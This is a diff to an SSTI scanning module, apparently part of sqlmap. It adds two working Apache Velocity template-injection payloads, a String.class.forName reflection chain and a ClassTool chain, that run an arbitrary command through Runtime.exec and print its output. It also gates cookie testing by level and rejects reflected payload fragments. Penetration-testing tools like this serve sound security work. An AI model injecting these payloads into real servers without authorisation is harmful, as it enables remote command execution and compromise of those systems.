@@ -142,15 +142,21 @@ _ENGINE_TABLE = (
            "#if(true) TRUE #end", "#if(false) TRUE #else FALSE #end", "TRUE", "FALSE",
            "#* velocity *#", "",
            "",  # no generic expression wrapper
-           # Velocity: full reflection chain (pre-2.3 only; patched by CVE-2020-13936)
-           (("#set($str=$class.inspect('java.lang.String').type)\n"
-             "#set($chr=$class.inspect('java.lang.Character').type)\n"
-             "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))\n"
-             "$ex.waitFor()\n"
-             "#set($out=$ex.getInputStream())\n"
-             "#foreach($i in [1..$out.available()])\n"
-             "$str.valueOf($chr.toChars($out.read()))\n"
-             "#end", "reflection chain"),)),
+           # Velocity (pre-2.3; patched by CVE-2020-13936). Primary: portable String.class.forName()
+           # reflection chain - needs NO velocity-tools $class in the context - reading the process
+           # stdout byte-by-byte so the command output is rendered in-band. Fallback: the velocity-tools
+           # ClassTool ($class) form, for apps that expose it.
+           (("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
+             "#set($chr=$x.class.forName('java.lang.Character'))"
+             "#set($str=$x.class.forName('java.lang.String'))"
+             "#set($ex=$rt.getRuntime().exec('{CMD}'))#set($w=$ex.waitFor())"
+             "#set($out=$ex.getInputStream())"
+             "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "String.class.forName chain"),
+            ("#set($str=$class.inspect('java.lang.String').type)"
+             "#set($chr=$class.inspect('java.lang.Character').type)"
+             "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))#set($w=$ex.waitFor())"
+             "#set($out=$ex.getInputStream())"
+             "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "ClassTool chain"))),
     Engine("Spring EL / Thymeleaf", "java",
            "${", "}",
            r"(?i)(?:org\.springframework\.expression\.\w+|org\.thymeleaf\.\w+|SpelEvaluationException|TemplateProcessingException|ExpressionParsingException|ValidationFailedException)",
@@ -588,6 +594,9 @@ def sstiScan():
     found = []
 
     for place in (_ for _ in SSTI_PLACES if _ in conf.paramDict):
+        # mirror sqlmap's SQL place level-gating: Cookie parameters are only tested at --level >= 2
+        if place == PLACE.COOKIE and conf.level < 2:
+            continue
         for parameter in list(conf.paramDict[place].keys()):
             if conf.testParameter and parameter not in conf.testParameter:
                 continue
@@ -802,6 +811,13 @@ def _executeCommand(place, parameter, engine, cmd):
             if original and output.startswith(original):
                 output = output[len(original):]
             output = output.strip()
+
+        # A template that ECHOED our payload directive instead of executing it (e.g. a patched or
+        # sandboxed Velocity reflecting the literal "$ex.waitFor()") is reflection, not command
+        # output: reject it so the loop falls through to the honest "no output received" warning
+        # instead of presenting a reflected payload fragment as a fake command result.
+        if output and output in payload:
+            continue
 
         # Suppress when output is just the baseline with the original value removed
         # (command produced no output; the template rendered empty)
